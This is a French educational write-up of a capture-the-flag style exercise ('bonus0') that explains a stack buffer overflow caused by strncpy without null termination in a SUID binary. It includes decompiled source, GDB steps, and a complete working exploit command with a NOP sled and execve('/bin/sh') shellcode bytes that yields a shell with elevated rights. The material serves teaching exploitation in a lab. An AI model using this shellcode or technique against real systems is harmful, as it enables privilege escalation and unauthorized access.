# Bonus0 - README Pédagogique

## 🎯 Objectif
Exploiter un **stack buffer overflow** causé par `strncpy` sans null-terminator pour écraser la **saved return address** et rediriger l'exécution vers un **shellcode injecté via NOP sled**.

**Technique** : strncpy overflow + NOP sled + Shellcode Injection

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l bonus0
-rwsr-s---+ 1 bonus1 users  5564 Mar  6  2016 bonus0
    ^
    └─ Bit SUID actif → s'exécute avec les droits de bonus1
```

### Tests comportementaux
```bash
$ ./bonus0
 -
hello
 -
world
hello world

$ ./bonus0
 -
$(python -c 'print "A"*200')
 -
test
Segmentation fault
```

**Observation** : Un input long provoque un segfault → overflow détecté.

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)

```cpp
#include <unistd.h>
#include <string.h>
#include <stdio.h>

void p(char *param_1, char *param_2) {
    char *pcVar1;
    char local_100c[4104];

    puts(param_2);
    read(0, local_100c, 0x1000);         // Lit jusqu'à 4096 bytes depuis stdin
    pcVar1 = strchr(local_100c, '\n');
    *pcVar1 = '\0';                       // Supprime le '\n'
    strncpy(param_1, local_100c, 0x14);  // ⚠️ Copie 20 bytes MAX, sans \0 si input >= 20
}

void pp(char *param_1) {
    char local_34[20];
    char local_20[20];

    p(local_34, &DAT_080486a0);          // 1er appel
    p(local_20, &DAT_080486a0);          // 2ème appel
    strcpy(param_1, local_34);           // ⚠️ Pas de limite de taille
    // boucle strlen sur param_1 (lit dans local_20 si pas null-terminé)
    (param_1 + strlen_result)[0] = ' ';
    (param_1 + strlen_result)[1] = '\0';
    strcat(param_1, local_20);           // ⚠️ Ajoute local_20 une 2ème fois
}

int main(void) {
    char local_3a[54];
    pp(local_3a);
    puts(local_3a);
    return 0;
}
```

---

## 💣 Vulnérabilité : strncpy sans null-terminator

### 1. La faille fondamentale

Le comportement de `strncpy` selon le manuel :

> *"If the source string has a size greater than that specified in parameter, then the produced string will not be terminated by null ASCII code."*

```cpp
strncpy(param_1, local_100c, 0x14);  // 0x14 = 20 bytes
```

Si l'input fait **exactement 20 caractères ou plus**, `param_1` ne sera **pas null-terminé**. Cela affecte toute opération de chaîne suivante.

### 2. Propagation de l'overflow

**Layout stack dans `pp()`** :
```
Adresses croissantes →
[local_34: 20 bytes][local_20: 20 bytes]
```

Quand `local_34` n'est pas null-terminé :

```cpp
strcpy(param_1, local_34);
```
La boucle interne de `strlen` / `strcpy` **continue de lire au-delà** de `local_34`, directement dans `local_20`. Résultat : `param_1` reçoit `local_34` + `local_20` = **40 bytes**.

Ensuite :
```cpp
strcat(param_1, local_20);  // Ajoute encore 20 bytes + 1 espace
```

**Résultat total dans `local_3a[54]`** :
```
[20B arg1][20B arg2][1B espace][20B arg2] = 61 bytes
```

Dans un buffer de **54 bytes** → débordement de **7 bytes** sur la saved return address.

### 3. Structure du débordement

```
Stack de main() :
┌──────────────────────────────────────────────┐
│ local_3a[54]                                 │ ← pp() écrit ici
│                                              │
│   [20B NOP] [20B arg2] [1B ' '] [arg2 repeat]│
│                                    ^         │
│                                    offset=9  │ ← EIP dans la répétition de arg2
├──────────────────────────────────────────────┤
│ saved EBP                                    │
├──────────────────────────────────────────────┤
│ saved EIP  ← ⚠️ ÉCRASÉ !                    │
└──────────────────────────────────────────────┘
```

### 4. Pourquoi EIP est dans le 2ème argument ?

Le payload final dans `local_3a` est :
```
[arg1 tronqué: 20B][arg2: 20B][ ][arg2 répété par strcat: 20B]
 ^--- strncpy        ^--- strcpy déborde  ^--- strcat ajoute
```

L'adresse de retour est atteinte **9 bytes** dans la 2ème copie de `arg2` (confirmé par pattern cyclique).

---

## 🔑 Concepts clés

### 1. strncpy vs strcpy

| Fonction | Null-terminator | Sécurité |
|---|---|---|
| `strcpy` | Oui (copie le `\0` source) | Non sécurisé (pas de limite) |
| `strncpy` | **Seulement si source < n** | Faux sentiment de sécurité |
| `strlcpy` | Toujours | Sécurisé |

**Piège classique** : `strncpy(dst, src, n)` ne garantit pas le null-terminator si `strlen(src) >= n`.

### 2. NOP Sled

**Problème** : Les adresses stack varient légèrement selon l'environnement (variables d'environnement, etc.).

**Solution** : Précéder le shellcode d'une longue séquence de `\x90` (NOP = No Operation). Toute adresse atterrissant dans cette zone "glisse" naturellement jusqu'au shellcode.

```
[NOP NOP NOP NOP ... NOP][SHELLCODE]
 ^                      ^
 Adresse approximative   Exécution garantie
```

**Taille du NOP sled** : 100 bytes → marge de 100 adresses possibles.

### 3. Injection dans le grand buffer

La vulnérabilité clé : `p()` lit 4096 bytes dans `local_100c` (buffer stack de `p()`), mais `strncpy` n'en copie que 20. Le reste du shellcode **reste en mémoire stack** pendant l'exécution de `pp()` et `main()`.

```
Stack de p() au 1er appel :
local_100c[4096] = [\x90 * 100][shellcode 28B][\x00...]
                    ^-- 20B copiés dans local_34
                    ^-- le reste reste en stack !
```

L'adresse `0xbfffe680` pointe dans ce grand buffer, accessible après le retour de `p()`.

### 4. Calcul de l'adresse cible

```
Base buffer local_100c = 0xbfffe680 (trouvé avec GDB)
+ 61 bytes (taille des deux inputs + espace) = 0xbfffe6bd  ← fin sécurisée
+ ~80 bytes (milieu NOP sled)               = 0xbfffe6d0  ← cible idéale
+ 100 bytes (fin NOP sled)                  = 0xbfffe6e4  ← limite haute
```

Choisir `0xbfffe6d0` donne une marge confortable des deux côtés.

---

## 🚀 Construction du payload

### Étape 1 : Trouver l'offset EIP

```bash
(gdb) run
# 1er input : exactement 20 chars (pour bloquer le null-terminator)
01234567890123456789
# 2ème input : pattern cyclique
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...

eip = 0x41336141  → offset = 9
```

### Étape 2 : Trouver l'adresse du buffer

```bash
(gdb) disass p
   0x080484d0 <+28>: lea eax,[ebp-0x1008]   ← local_100c
(gdb) b *p+28
(gdb) run
(gdb) x $ebp-0x1008
0xbfffe680                                   ← adresse de base
```

### Étape 3 : Assembler le payload final

```
1er input (stdin) :
[\x90 * 100][shellcode 28B]
 ^--- NOP sled large        ^--- exécutable

2ème input (stdin) :
["A" * 9][\xd0\xe6\xff\xbf]["B" * 7]
 ^offset  ^EIP              ^padding
```

### Commande finale

```bash
(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; \
 python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; \
 cat) | ./bonus0
```

> **Note** : Le `cat` maintient stdin ouvert pour interagir avec le shell obtenu.

---

## 🔄 Déroulement de l'exploitation

```
1. 1er appel p() :
   read() → local_100c = [\x90*100][shellcode][\x00...]
   strncpy(local_34, local_100c, 20) → local_34 = [\x90*20]  ← PAS de \0 !
   
2. 2ème appel p() :
   read() → local_100c = ["A"*9][0xbfffe6d0]["B"*7]
   strncpy(local_20, local_100c, 20) → local_20 = ["A"*9][addr]["B"*7]

3. pp() :
   strcpy(local_3a, local_34) → strlen lit jusqu'à \0 dans local_20 !
   local_3a ← [\x90*20]["A"*9][0xbfffe6d0]["B"*7]
   
   Ajoute ' ' à la position 40 → local_3a[40] = ' '
   
   strcat(local_3a, local_20) :
   local_3a ← [\x90*20]["A"*9][addr]["B"*7][ ]["A"*9][addr]["B"*7]
   Total = 61 bytes → déborde local_3a[54] → EIP = 0xbfffe6d0 ✅

4. main() return :
   EIP = 0xbfffe6d0
   → NOP sled → shellcode execve("/bin/sh") ✅
   → Shell avec droits bonus1 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-121** : Stack-based Buffer Overflow
- **CWE-170** : Improper Null Termination
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **NOP sled** : Zone de glissement vers le shellcode
- **Shellcode injection** : `execve("/bin/sh")` injecté dans le grand buffer de `p()`

---

## 🎓 Résumé

1. **Vulnérabilité** : `strncpy` ne null-termine pas si input ≥ 20 bytes
2. **Propagation** : `strlen`/`strcpy` débordent de `local_34` dans `local_20`
3. **Overflow** : 61 bytes dans `local_3a[54]` → EIP accessible à offset 9 du 2ème input
4. **Payload** : NOP sled + shellcode dans le 1er input, adresse dans le 2ème
5. **Résultat** : Shell bonus1

---

## 🔐 Différences avec les niveaux précédents

| | Level2 | Bonus0 |
|---|---|---|
| **Zone shellcode** | Heap (via strdup) | Stack (grand buffer de p()) |
| **Overflow** | Stack direct | Chaîne strncpy→strcpy→strcat |
| **Technique** | ret2heap | NOP sled direct |
| **Complexité** | Simple | Indirection multi-fonctions |

**Bonus0 est unique** : L'overflow ne vient pas d'une seule fonction vulnérable mais de la **composition** de plusieurs appels qui propagent l'absence de null-terminator.
